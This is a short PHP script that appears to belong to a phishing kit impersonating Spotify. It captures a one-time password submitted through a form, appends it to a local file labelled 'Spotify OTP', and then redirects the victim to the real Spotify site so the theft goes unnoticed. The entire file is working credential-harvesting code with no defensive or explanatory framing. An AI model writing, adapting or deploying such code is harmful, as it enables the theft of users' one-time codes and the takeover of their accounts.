<?php
file_put_contents("otp.txt", "Spotify OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.spotify.com/');
?>
